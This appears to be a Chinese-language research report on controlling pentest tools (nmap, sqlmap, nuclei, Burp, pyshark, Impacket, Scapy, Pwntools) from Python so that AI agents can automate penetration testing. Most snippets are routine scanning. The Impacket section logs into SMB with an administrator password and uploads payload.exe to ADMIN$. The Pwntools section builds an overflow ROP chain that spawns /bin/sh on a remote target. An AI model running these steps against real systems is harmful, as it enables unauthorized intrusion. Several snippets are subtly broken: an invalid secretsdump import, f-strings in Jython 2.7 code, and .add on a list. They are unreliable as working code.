# Python 渗透测试工具库研究

> 研究日期：2026-05-19  
> 目的：理清如何用 Python 程序化驱动主流渗透测试工具，为 AI Agent 自动化渗透提供技术选型参考

---

## 一、概述

本报告研究以下内容：
1. **工具能否通过 Python 控制** —— 不是"这个工具有 Python 版"，而是"能否在 Python 代码中调用、控制、解析输出"
2. **对应的库/API 是什么** —— 原生绑定、REST API、子进程封装等
3. **示例代码** —— 可直接复用的基本用法

覆盖工具分两类：
- **外部工具驱动**：nmap、sqlmap、nuclei、subfinder/httpx、Burp Suite、Wireshark/tshark
- **Python 原生的渗透框架**：Impacket、Scapy、Pwntools

---

## 二、外部工具驱动

### 2.1 Nmap → python-nmap

| 项目 | 说明 |
|------|------|
| **Python 可控？** | ✅ 是，python-nmap 是对 nmap 命令的封装，调用系统 nmap 二进制 |
| **库/API** | `python-nmap`（PyPI 包名 `python-nmap`，最新版 0.7.1，2021年发布） |
| **安装** | `pip install python-nmap`（系统需提前安装 nmap） |

**示例代码：**

```python
import nmap

# 基本端口扫描
nm = nmap.PortScanner()
nm.scan('127.0.0.1', '22-443')
print(nm.command_line())  # 实际执行的nmap命令
print(nm.all_hosts())     # 发现的所有主机

for host in nm.all_hosts():
    print(f"Host: {host} ({nm[host].hostname()})")
    print(f"State: {nm[host].state()}")
    for proto in nm[host].all_protocols():
        ports = nm[host][proto].keys()
        for port in sorted(ports):
            info = nm[host][proto][port]
            print(f"  {proto}/{port}: {info['state']} ({info['name']})")

# 异步扫描
nma = nmap.PortScannerAsync()
def callback(host, result):
    print(f"{host}: {result}")
nma.scan(hosts='192.168.1.0/24', arguments='-sP', callback=callback)
nma.wait(5)

# 逐步扫描（yield模式）
nm_yield = nmap.PortScannerYield()
for result in nm_yield.scan('192.168.1.0/24', '22,80,443'):
    print(result)
```

**注意：**
- python-nmap 本质是解析 nmap 的 XML 输出（`-oX -`），不是 C 绑定
- 需要系统预装 nmap 且 `nmap` 命令在 PATH 中
- 支持 NSE 脚本结果解析
- 支持超时设置

---

### 2.2 SQLMap → sqlmapapi（REST API）

| 项目 | 说明 |
|------|------|
| **Python 可控？** | ✅ 是，SQLMap 自带 RESTful API 服务器（`sqlmapapi.py`） |
| **库/API** | HTTP REST API（JSON），无独立 PyPI 包，直接发 HTTP 请求 |
| **安装** | `git clone https://github.com/sqlmapproject/sqlmap.git`，使用内置的 `sqlmapapi.py` |

**使用方式：**

**第一步：启动 API 服务器**
```bash
python sqlmapapi.py -s -H 127.0.0.1 -p 8775
```

**第二步：通过 HTTP 客户端控制**

```python
import requests
import json
import time

API_BASE = "http://127.0.0.1:8775"

# 1. 创建新任务
resp = requests.get(f"{API_BASE}/task/new")
task_id = resp.json()["taskid"]
print(f"Task ID: {task_id}")

# 2. 设置扫描选项
options = {
    "url": "http://testphp.vulnweb.com/artists.php?artist=1",
    "batch": True,
    "threads": 10,
    "risk": 2,
    "level": 3
}
requests.post(f"{API_BASE}/option/{task_id}/set", json=options)

# 3. 开始扫描
requests.post(f"{API_BASE}/scan/{task_id}/start")

# 4. 轮询状态
while True:
    status = requests.get(f"{API_BASE}/scan/{task_id}/status").json()
    print(f"Status: {status['status']}")

    # 获取日志
    log = requests.get(f"{API_BASE}/scan/{task_id}/log").json()
    for entry in log["log"][-3:]:
        print(f"  [{entry['level']}] {entry['message']}")

    if status["status"] == "terminated":
        break
    time.sleep(2)

# 5. 获取结果
data = requests.get(f"{API_BASE}/scan/{task_id}/data").json()
print(json.dumps(data, indent=2, ensure_ascii=False))

# 6. 删除任务
requests.get(f"{API_BASE}/task/{task_id}/delete")
```

**API 端点总结：**

| 端点 | 方法 | 作用 |
|------|------|------|
| `/task/new` | GET | 创建新任务（返回 taskid） |
| `/task/<tid>/delete` | GET | 删除任务 |
| `/option/<tid>/list` | GET | 列出当前选项 |
| `/option/<tid>/set` | POST | 设置扫描选项 |
| `/scan/<tid>/start` | POST | 开始扫描 |
| `/scan/<tid>/stop` | POST | 停止扫描 |
| `/scan/<tid>/status` | GET | 查询状态 |
| `/scan/<tid>/data` | GET | 获取扫描结果 |
| `/scan/<tid>/log` | GET | 获取日志 |

---

### 2.3 Nuclei → PyNuclei（第三方封装） / subprocess

| 项目 | 说明 |
|------|------|
| **Python 可控？** | ✅ 两种方式：PyNuclei 第三方库 / 直接 `subprocess` 调用 CLI |
| **库/API** | `PyNuclei`（PyPI，v1.4.5，非官方） |
| **安装** | `pip install PyNuclei`（系统仍需预装 nuclei 二进制） |

#### 方式 A：PyNuclei 库

```python
from PyNuclei import Nuclei

# 指定 nuclei 二进制路径
nucleiScanner = Nuclei("/usr/local/bin/nuclei")

# 基本扫描
result = nucleiScanner.scan(
    "example.com",
    templates=["cves", "misconfiguration"],
    rateLimit=150,
    verbose=False,
)

print(result)

# 获取可用模板
print(nucleiScanner.nucleiTemplates)

# 更新 nuclei 引擎和模板
Nuclei.updateNuclei(verbose=True)
```

#### 方式 B：subprocess 调用 CLI

```python
import subprocess
import json

def nuclei_scan(target: str, templates: list[str] = None) -> list[dict]:
    """通过 subprocess 调用 nuclei CLI"""
    cmd = ["nuclei", "-u", target, "-json", "-silent"]
    if templates:
        cmd.extend(["-t", ",".join(templates)])
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
    findings = []
    for line in result.stdout.strip().split("\n"):
        if line:
            findings.append(json.loads(line))
    return findings

# 使用示例
results = nuclei_scan("https://example.com", ["cves", "misconfiguration"])
for finding in results:
    print(f"[{finding.get('severity','?')}] {finding.get('info',{}).get('name','?')}: {finding.get('matched-at','?')}")
```

---

### 2.4 Subfinder / httpx → subprocess

| 项目 | 说明 |
|------|------|
| **Python 可控？** | ✅ 通过 subprocess 调用 CLI（无官方 Python 库） |
| **库/API** | 无独立 Python 库，直接 `subprocess.run()` |
| **安装** | 系统预装 subfinder 和 httpx 二进制 |

```python
import subprocess
import json

def subfinder_enum(domain: str) -> list[str]:
    """子域名枚举"""
    cmd = ["subfinder", "-d", domain, "-silent"]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    return [line.strip() for line in result.stdout.strip().split("\n") if line]

def httpx_probe(hosts: list[str]) -> list[dict]:
    """HTTP 服务探活"""
    input_data = "\n".join(hosts)
    # JSON 行输出
    cmd = [
        "httpx", "-silent",
        "-status-code", "-title", "-tech-detect",
        "-follow-redirects", "-json"
    ]
    result = subprocess.run(
        cmd, input=input_data, capture_output=True,
        text=True, timeout=120
    )
    findings = []
    for line in result.stdout.strip().split("\n"):
        if line:
            findings.append(json.loads(line))
    return findings

# 组合使用
subdomains = subfinder_enum("example.com")
print(f"发现 {len(subdomains)} 个子域名")

alive = httpx_probe(subdomains[:50])  # 前50个
for site in alive:
    print(f"{site.get('url','?')} [{site.get('status_code','?')}] {site.get('title','?')}")
```

**说明：**
- subfinder 和 httpx 都是 ProjectDiscovery 生态的工具
- 无原生 Python API，但有**管道组合**能力：`subfinder -d example.com -silent | httpx -silent -status-code -title`
- 输出支持 JSON 行格式，便于 Python 解析
- 适合在自动化扫描流水线中组合使用

---

### 2.5 Burp Suite → Montoya API / SQLiPy

| 项目 | 说明 |
|------|------|
| **Python 可控？** | ⚠️ 有条件。Burp 扩展用 Java/Kotlin 写 Montoya API（新版）或 Java（旧版 BApp）。Python 通过 Jython 运行（Python 2.7），或通过 REST API / 社区项目间接控制 |
| **库/API** | Montoya API（Java 接口），`sqlipy`（Python+SQLMap 集成） |
| **安装** | Burp Suite Professional 或 Community，Jython 2.7 jar |

#### 方式 A：Montoya API（Java/Kotlin，官方推荐）

```java
// Java 示例（Montoya API），非 Python
// 需在 Burp Extender 中加载编译后的 jar
import burp.api.montoya.*;
import burp.api.montoya.http.handler.*;

public class MyExtension implements HttpHandler {
    @Override
    public void initialize(MontoyaApi api) {
        api.http().registerHttpHandler(this);
        api.logging().logToOutput("Extension loaded!");
    }

    @Override
    public RequestToBeSentAction handleHttpRequestToBeSent(
            HttpRequestToBeSent request) {
        // 修改或拦截请求
        api.logging().logToOutput("Request: " + request.url());
        return RequestToBeSentAction.continueWith(request);
    }

    @Override
    public ResponseReceivedAction handleHttpResponseReceived(
            HttpResponseReceived response) {
        // 检查或修改响应
        return ResponseReceivedAction.continueWith(response);
    }
}
```

#### 方式 B：Python + Jython（社区方案）

Python 脚本在 Jython 下运行，作为 Burp 扩展：

```python
# Jython 版 Burp 扩展（Python 2.7 语法）
from burp import IBurpExtender, IHttpListener

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Python Burp Extension")
        callbacks.registerHttpListener(self)
        print("Python extension loaded!")

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if messageIsRequest:
            request = messageInfo.getRequest()
            analyzed = self._helpers.analyzeRequest(request)
            print(f"URL: {analyzed.getUrl()}")
            # 可以修改请求
            headers = list(analyzed.getHeaders())
            headers.add("X-Python: hermes-agent")
            body = request.tostring()[analyzed.getBodyOffset():]
            messageInfo.setRequest(
                self._helpers.buildHttpMessage(headers, body)
            )
```

#### 方式 C：SQLiPy（SQLMap 集成）

```python
# SQLiPy 本质是 Burp 插件 + SQLMap API 桥接
# 在 Burp 的右击菜单中选 "SQLiPy Scan" 启动
# 源码参考：https://github.com/PortSwigger/sqli-py
```

#### 方式 D：Burp REST API（非官方）

社区项目如 `burp-rest-api` 提供 REST 接口：

```python
import requests

# 如果有 burp-rest-api 运行
BURP_API = "http://127.0.0.1:8081"

# 添加目标到范围
requests.put(f"{BURP_API}/v1/scope", json={"url": "https://target.com/*"})

# 检查是否在范围
resp = requests.get(f"{BURP_API}/v1/scope/include")
print(resp.json())
```

**总结：Burp Suite + Python 最佳路径**

| 场景 | 推荐方式 |
|------|---------|
| 写 Burp 扩展 | Montoya API（Java/Kotlin），或 Jython（Python 2.7） |
| 自动化 SQL 注入 | SQLiPy（Burp 插件 + SQLMap API） |
| 外部控制 Burp | burp-rest-api（社区项目，非官方） |
| AI Agent 集成 | 通过 subprocess 调用 Burp CLI headless 模式 + 解析输出 |

---

### 2.6 Wireshark / tshark → pyshark

| 项目 | 说明 |
|------|------|
| **Python 可控？** | ✅ 是，pyshark 是 tshark 的 Python 封装 |
| **库/API** | `pyshark`（PyPI，活跃维护） |
| **安装** | `pip install pyshark`（系统需预装 tshark） |

```python
import pyshark

# 1. 从 pcap 文件读取
cap = pyshark.FileCapture('capture.pcap')
for i, packet in enumerate(cap[:5]):
    print(f"Packet {i+1}")
    print(f"  Time: {packet.sniff_time}")
    print(f"  Length: {packet.length}")
    # 检查是否有指定协议层
    if hasattr(packet, 'ip'):
        print(f"  IP: {packet.ip.src} -> {packet.ip.dst}")
    if hasattr(packet, 'tcp'):
        print(f"  TCP: {packet.tcp.srcport} -> {packet.tcp.dstport}")
    if hasattr(packet, 'http'):
        print(f"  HTTP: {packet.http.request_method} {packet.http.request_uri}")
    print()

# 2. 实时抓包
live = pyshark.LiveCapture(interface='eth0', bpf_filter='tcp port 80')
for packet in live.sniff_continuously(packet_count=10):
    if hasattr(packet, 'ip'):
        print(f"{packet.ip.src}:{packet.tcp.srcport} -> "
              f"{packet.ip.dst}:{packet.tcp.dstport}")

# 3. 使用显示过滤器
cap_filtered = pyshark.FileCapture('capture.pcap', display_filter='http')
http_packets = list(cap_filtered)
print(f"HTTP 请求数量: {len(http_packets)}")

# 4. 导出为 JSON
for packet in cap:
    try:
        print(packet)
    except Exception:
        pass

cap.close()
```

**pyshark 核心类：**

| 类 | 用途 |
|----|------|
| `FileCapture` | 从 pcap/pcapng 文件读取 |
| `LiveCapture` | 实时抓包（指定网卡） |
| `RemoteCapture` | 远程抓包（通过 rpcapd） |
| `InMemCapture` | 从内存中的 pcap 数据读取 |

**pyshark 局限性：**
- 每个包都要调用 tshark 解析，大量包时速度慢
- 严格依赖系统安装的 tshark 版本
- 解析大文件（>1GB）时内存消耗较大
- 推荐方案：小文件/实时用 pyshark，大文件用 `tshark -T json` + Python JSON 解析

---

## 三、Python 原生渗透框架

### 3.1 Impacket

| 项目 | 说明 |
|------|------|
| **GitHub** | https://github.com/fortra/impacket |
| **本质** | Python 类库，用于构造和操作网络协议（重点是 Windows 协议：SMB、Kerberos、LDAP、WMI、WinRM 等） |
| **安装** | `pip install impacket` |
| **典型用途** | 内网渗透、域渗透、Windows 协议交互 |

```python
from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import LocalOperations, SAMHashes

# SMB 连接
conn = SMBConnection('192.168.1.100')
conn.login('administrator', 'P@ssw0rd', domain='WORKGROUP')

# 列举共享
shares = conn.listShares()
for share in shares:
    print(f"  Share: {share['shi1_netname']}")

# 列举目录
files = conn.listPath('C$', 'Users\\*')
for f in files:
    print(f"  {f.get_longname()} ({f.get_filesize()} bytes)")

# SMB 文件上传/下载
with open('local_file.txt', 'rb') as f:
    conn.putFile('ADMIN$', 'temp\\payload.exe', f.read())

data = conn.getFile('ADMIN$', 'temp\\result.txt')
```

**常用 Impacket 工具（命令行）：**

| 工具 | 用途 |
|------|------|
| `secretsdump.py` | 从域控导出哈希 |
| `psexec.py` | 通过 SMB 远程执行命令 |
| `wmiexec.py` | 通过 WMI 远程执行命令 |
| `smbexec.py` | 通过 SMB 服务执行命令 |
| `getTGT.py` / `getST.py` | Kerberos 票据操作 |
| `ntlmrelayx.py` | NTLM 中继攻击 |

**Python 调用 secretsdump：**

```python
# 实际上 impacket 的工具类也可以直接导入使用
from impacket.examples.secretsdump import Dump Secrets

# 大多数 impacket 工具的实现类都在 impacket.examples 下
# 可直接 import 并调用
```

---

### 3.2 Scapy

| 项目 | 说明 |
|------|------|
| **GitHub** | https://github.com/secdev/scapy |
| **本质** | 交互式数据包操作库，可伪造、解码、发送、捕获网络数据包 |
| **安装** | `pip install scapy` |
| **典型用途** | 自定义协议扫描、中间人攻击、网络探测、流量分析 |

```python
from scapy.all import *

# 1. 构建和发送数据包
# 构造 TCP SYN 包
ip = IP(dst="192.168.1.1")
syn = TCP(sport=1024, dport=80, flags="S")
packet = ip/syn

# 发送并接收响应
response = sr1(packet, timeout=2)
if response:
    print(f"Got response: {response.summary()}")
    if response.haslayer(TCP):
        tcp_layer = response.getlayer(TCP)
        print(f"Flags: {tcp_layer.flags}")

# 2. ARP 扫描（发现局域网主机）
arp_request = ARP(pdst="192.168.1.0/24")
broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
packet = broadcast/arp_request
answered = srp(packet, timeout=2, verbose=False)[0]

for sent, received in answered:
    print(f"{received.psrc} - {received.hwsrc}")

# 3. DNS 查询
dns_request = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com"))
reply = sr1(dns_request, timeout=2)
if reply and reply.haslayer(DNS):
    for ans in reply[DNS].an:
        print(f"{ans.rrname} -> {ans.rdata}")

# 4. 抓包
packets = sniff(count=10, filter="tcp port 80")
wrpcap("captured.pcap", packets)

# 5. 读取 pcap
packets = rdpcap("captured.pcap")
for pkt in packets:
    print(pkt.summary())
```

**Scapy 核心能力：**
- 支持 300+ 协议的解码/构造
- 支持 pcap 读写
- 支持路由追踪、sniff 过滤
- 内置 `send()`、`sr()`、`sr1()`、`sniff()` 等函数
- 适合网络层攻击的原型开发

---

### 3.3 Pwntools

| 项目 | 说明 |
|------|------|
| **GitHub** | https://github.com/Gallopsled/pwntools |
| **本质** | CTF 与漏洞利用开发框架，面向二进制漏洞挖掘 |
| **安装** | `pip install pwntools` |
| **典型用途** | 二进制漏洞利用（栈溢出、格式化字符串、ROP）、Shellcode 生成、远程交互 |

```python
from pwn import *

# 设置架构
context.arch = 'amd64'
context.os = 'linux'

# 1. 连接远程服务
r = remote('target.com', 1337)
# 或启动本地进程
p = process('./vulnerable')

# 2. 交互
r.sendline(b'hello')
response = r.recvline()
print(f"Got: {response}")

# 3. 生成 Shellcode
shellcode = asm(shellcraft.sh())
print(f"Shellcode length: {len(shellcode)}")

# 4. 构造 ROP 链（自动查找 gadgets）
elf = ELF('./vulnerable')
rop = ROP(elf)
rop.call('system', [next(elf.search(b'/bin/sh'))])
print(rop.dump())

# 5. 格式化字符串利用
payload = fmtstr_payload(offset=6, writes={elf.got['printf']: elf.plt['system']})

# 6. 打包整数
addr = p64(0x7fffffff)
deaddr = u64(b'\x01\x02\x03\x04\x05\x06\x07\x08')

# 7. GDB 调试
p = gdb.debug('./vulnerable', '''
break main
continue
''')

# 8. 发送最终 payload
payload = b'A' * 72  # 覆盖缓冲区
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(elf.search(b'/bin/sh')))
payload += p64(elf.plt['system'])
r.sendline(payload)
r.interactive()
```

**Pwntools 核心模块：**

| 模块 | 用途 |
|------|------|
| `pwnlib.tubes` | 网络/进程通信抽象（remote, process, ssh） |
| `pwnlib.shellcraft` | Shellcode 生成（多架构） |
| `pwnlib.rop` | ROP 链自动构造 |
| `pwnlib.elf` | ELF 文件解析 |
| `pwnlib.asm` | 汇编/反汇编 |
| `pwnlib.gdb` | GDB 集成调试 |
| `pwnlib.util.packing` | p64/u64 等打包工具 |

---

## 四、Python 渗透框架生态全景

```
┌─────────────────────────────────────────────────────────────────┐
│                     Python 渗透工具栈                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  信息收集层                                                     │
│  ├── python-nmap    ─── 端口扫描                                │
│  ├── subfinder+httpx ─── 子域名 + HTTP 探活（subprocess）        │
│  └── pyshark       ─── 流量分析 / pcap 解析                     │
│                                                                 │
│  漏洞扫描层                                                     │
│  ├── PyNuclei       ─── 漏洞模板扫描                            │
│  ├── sqlmapapi      ─── SQL 注入自动化                          │
│  └── Burp Montoya API ─── Web 漏洞人工辅助 + 自动化              │
│                                                                 │
│  协议层/底层框架                                                 │
│  ├── Scapy          ─── 数据包操控（网络层攻击原型）              │
│  ├── Impacket       ─── Windows 协议（内网/域渗透基础）          │
│  └── Pwntools       ─── 二进制漏洞利用                          │
│                                                                 │
│  AI Agent 集成策略                                               │
│  ├── 有 Python 库 → 直接 import 调用                            │
│  ├── 有 REST API  → requests + JSON                             │
│  └── 只有 CLI     → subprocess + JSON 行输出解析                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 五、AI Agent 集成推荐

### 5.1 最佳集成方式汇总

| 工具 | 推荐方式 | 理由 |
|------|---------|------|
| Nmap | `python-nmap`（库） | 成熟稳定，解析方便 |
| SQLMap | `sqlmapapi`（REST API） | 异步任务管理，结果结构化 |
| Nuclei | `subprocess` + JSON | PyNuclei 依赖 nuclei 二进制，直接用 CLI 更可靠 |
| Subfinder | `subprocess` + JSON | 无官方 Python 库 |
| httpx | `subprocess` + JSON | 同上 |
| Burp Suite | `subprocess` 调用 CLI headless | 或 Montoya API（Java）做扩展 |
| tshark | `pyshark`（小文件/实时） | 大文件用 `tshark -T json` + Python |
| | 或 `subprocess` + `-T json`（大文件） | |

### 5.2 通用 CLI 封装模板

```python
import subprocess
import json
import shutil
from typing import Optional

class PentestTool:
    """通用渗透工具 CLI 封装基类"""
    
    def __init__(self, binary_name: str):
        self.binary = shutil.which(binary_name)
        if not self.binary:
            raise FileNotFoundError(f"Binary '{binary_name}' not found in PATH")
    
    def run(self, args: list[str], input_data: Optional[str] = None,
            timeout: int = 120, json_output: bool = True) -> list[dict]:
        """运行工具并解析 JSON 行输出"""
        cmd = [self.binary] + args
        result = subprocess.run(
            cmd,
            input=input_data,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        if result.returncode != 0:
            raise RuntimeError(f"Tool failed: {result.stderr}")
        
        findings = []
        for line in result.stdout.strip().split("\n"):
            if line:
                try:
                    findings.append(json.loads(line))
                except json.JSONDecodeError:
                    findings.append({"raw": line})
        return findings
```

---

## 六、关键结论

1. **大多数渗透工具可以通过 Python 控制**，但方式不同：原生库、REST API、subprocess
2. **Python 本身也是强大的渗透框架**（Impacket、Scapy、Pwntools 是三大支柱）
3. **AI Agent 集成的最佳实践**：
   - 优先选择有原生 Python 库的工具（nmap、scapy、impacket、pwntools）
   - 其次选择有 REST API 的工具（sqlmapapi）
   - 最后才用 subprocess 调用 CLI（nuclei、subfinder、httpx）
4. **管道组合能力**（`subfinder | httpx | nuclei`）是 ProjectDiscovery 生态的核心优势，subprocess 方式天然支持
5. **JSON 行输出**是现代工具的趋势，比 XML 解析更友好

---

## 参考链接

- python-nmap: https://xael.org/pages/python-nmap-en.html
- SQLMap API: https://github.com/sqlmapproject/sqlmap
- PyNuclei: https://pypi.org/project/PyNuclei/
- Nuclei: https://github.com/projectdiscovery/nuclei
- Subfinder: https://github.com/projectdiscovery/subfinder
- httpx: https://github.com/projectdiscovery/httpx
- Burp Montoya API: https://portswigger.github.io/burp-extensions-montoya-api/
- SQLiPy: https://github.com/PortSwigger/sqli-py
- pyshark: https://github.com/KimiNewt/pyshark
- Impacket: https://github.com/fortra/impacket
- Scapy: https://scapy.net/
- Pwntools: https://github.com/Gallopsled/pwntools
